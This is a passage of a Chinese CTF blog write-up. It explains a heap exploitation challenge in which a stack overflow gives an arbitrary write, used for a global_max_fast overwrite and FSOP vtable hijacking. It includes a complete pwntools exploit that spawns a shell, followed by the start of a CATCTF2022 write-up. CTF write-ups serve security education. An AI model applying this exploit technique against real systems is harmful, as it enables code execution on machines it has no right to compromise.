<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD buf[<span class="number">4</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  _QWORD *magic; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You cannot edit chunk but you can edit comment&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Comment:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">40uLL</span>);                          <span class="comment">// 栈溢出</span></span><br><span class="line">  comment[<span class="number">0</span>] = buf[<span class="number">0</span>];</span><br><span class="line">  comment[<span class="number">1</span>] = buf[<span class="number">1</span>];</span><br><span class="line">  comment[<span class="number">2</span>] = buf[<span class="number">2</span>];</span><br><span class="line">  comment[<span class="number">3</span>] = buf[<span class="number">3</span>];</span><br><span class="line">  magicS = (__int64)magic;</span><br><span class="line">  *magic = <span class="number">0xDEADBEEF</span>LL;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Edit OK&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>栈溢出导致 <code>0xDEADBEEF</code> 任意写</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>本题目的泄露很简单，可以轻松获取 <code>heap_base</code> 和 <code>libc_base</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;p&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;pppppppp&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0xc30</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;k&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;kkkkkkkk&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>然后可以利用 <code>0xDEADBEEF</code> 任意写来覆盖 <code>global_max_fast</code></p>
<p>这样做有两个好处：</p>
<ul>
<li>可以把大 chunk 放入 fastbin</li>
<li>可以在 <code>main_arena</code> 中制造溢出（fast chunk 会根据自己的 size，来决定其 free chunk head 在 <code>main_arena</code> 中的偏移）</li>
</ul>
<p>可以利用 <code>main_arena</code> 中的溢出来覆盖 <code>_IO_list_all</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以在 <code>fastbinsY[NFASTBINS]</code> 进行溢出</li>
</ul>
<p>计算偏移：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;main_arena </span><br><span class="line">$<span class="number">1</span> = (malloc_state *) <span class="number">0x7f85c2d99b20</span> &lt;main_arena&gt;</span><br><span class="line">pwndbg&gt; p &amp;_IO_list_all</span><br><span class="line">$<span class="number">2</span> = (_IO_FILE_plus **) <span class="number">0x7f85c2d9a520</span> &lt;_IO_list_all&gt;</span><br><span class="line">pwndbg&gt; distance <span class="number">0x7f85c2d99b20</span> <span class="number">0x7f85c2d9a520</span></span><br><span class="line"><span class="number">0x7f85c2d99b20</span>-&gt;<span class="number">0x7f85c2d9a520</span> is <span class="number">0xa00</span> bytes (<span class="number">0x140</span> words)</span><br></pre></td></tr></table></figure>
<ul>
<li>先计算 <code>main_arena</code> 和 <code>_IO_list_all</code> 之间的偏移</li>
<li>把这个数值乘2就可以得到目标 size</li>
</ul>
<p>伪造 FILE 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f897d54e520</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f897d54e520</span> (_IO_list_all) —▸ <span class="number">0x563ec953d450</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我们选择 <code>vtable</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_jump_t*)_IO_list_all.vtable </span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0</span>,</span><br><span class="line">  __finish = <span class="number">0x0</span>,</span><br><span class="line">  __overflow = <span class="number">0x0</span>, <span class="comment">// target</span></span><br><span class="line">  __underflow = <span class="number">0x0</span>,</span><br><span class="line">  __uflow = <span class="number">0x0</span>,</span><br><span class="line">  __pbackfail = <span class="number">0x0</span>,</span><br><span class="line">  __xsputn = <span class="number">0x0</span>,</span><br><span class="line">  __xsgetn = <span class="number">0x0</span>,</span><br><span class="line">  __seekoff = <span class="number">0x0</span>,</span><br><span class="line">  __seekpos = <span class="number">0x0</span>,</span><br><span class="line">  __setbuf = <span class="number">0x0</span>,</span><br><span class="line">  __sync = <span class="number">0x0</span>,</span><br><span class="line">  __doallocate = <span class="number">0x0</span>,</span><br><span class="line">  __read = <span class="number">0x0</span>,</span><br><span class="line">  __write = <span class="number">0x0</span>,</span><br><span class="line">  __seek = <span class="number">0x0</span>,</span><br><span class="line">  __close = <span class="number">0x0</span>,</span><br><span class="line">  __stat = <span class="number">0x0</span>,</span><br><span class="line">  __showmanyc = <span class="number">0x0</span>,</span><br><span class="line">  __imbue = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可见第4片区域就是 <code>__overflow</code> 的虚表，我们可以劫持该虚表为“one_gadget”或者其他需要的函数</li>
</ul>
<p>调用链为：<code>malloc_printerr -&gt; _IO_flush_all_lockp -&gt; _IO_overflow(system)</code></p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./heap2019&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.31.0.116&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0xACC)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.exit&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content length:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Comment:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content id:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    cmd(<span class="number">2019</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+p.recv(<span class="number">12</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0x202040</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">bss_start = pro_base + <span class="number">0x202020</span></span><br><span class="line">chunk_list = pro_base + <span class="number">0x202040</span></span><br><span class="line"><span class="comment">#edit(&quot;a&quot;*0x20 + p64(bss_start))</span></span><br><span class="line">success(<span class="string">&quot;chunk_list &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(chunk_list))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;p&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;pppppppp&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0xc30</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">&quot;k&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;kkkkkkkk&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">global_max_fast = libc_base + <span class="number">0x3c67f8</span></span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">IO_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;global_max_fast &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(global_max_fast))</span><br><span class="line">success(<span class="string">&quot;system_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line">success(<span class="string">&quot;IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">3</span>] + libc_base</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">fake_fsop_addr = heap_base + <span class="number">0x1450</span></span><br><span class="line">fake_vtable = fake_fsop_addr + <span class="number">0xd8</span></span><br><span class="line"></span><br><span class="line">fsop =  <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">fsop += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>)</span><br><span class="line">fsop =  fsop.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fsop += p64(fake_vtable)</span><br><span class="line">fsop += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(one_gadget)</span><br><span class="line">add(<span class="number">0x1400</span>, fsop) </span><br><span class="line"></span><br><span class="line">edit(<span class="string">&quot;b&quot;</span>*<span class="number">0x20</span>+p64(global_max_fast))</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Content length:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/06/CATCTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/06/CATCTF2022/" class="post-title-link" itemprop="url">CATCTF2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-01-06 12:13:56 / Modified: 12:20:19" itemprop="dateCreated datePublished" datetime="2023-01-06T12:13:56+08:00">2023-01-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>20k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>19 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="welcome-CAT-CTF"><a href="#welcome-CAT-CTF" class="headerlink" title="welcome_CAT_CTF"></a>welcome_CAT_CTF</h2><p>欢迎来到 CAT CTF，本题为签到题,选手可以通过暴打出题人或者运维拿 flag(用awsd操控，按键j为确定键，建议全屏运行) </p>
<p><strong>入侵思路</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">char</span> *)s[<span class="number">100</span> * v0 - <span class="number">100</span> + v1] == <span class="string">&quot;@&quot;</span> &amp;&amp; glod &gt; <span class="number">100000000</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GET_FLAG!&quot;</span>);</span><br><span class="line">  nc = get_nc();</span><br><span class="line">  get_flag(nc);</span><br><span class="line">  getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>满足这个条件就可以拿 flag</li>
</ul>
<p>程序的逻辑如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>W</th>
<th>S</th>
<th>A</th>
<th>D</th>
</tr>
</thead>
<tbody>
<tr>
<td>v0—</td>
<td>v0++</td>
<td>v1—</td>
<td>v1++</td>
</tr>
</tbody>
</table>
</div>
<p>但是按照程序本身的逻辑是不可能拿到 flag 的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( glod &lt;= <span class="number">99</span> )</span><br><span class="line">  ++glod;</span><br></pre></td></tr></table></figure>
<p>于是我们就需要对 <code>client</code> 进行修改</p>
<ul>
<li>注意：<code>server</code> 中还会进行2次检查</li>
</ul>
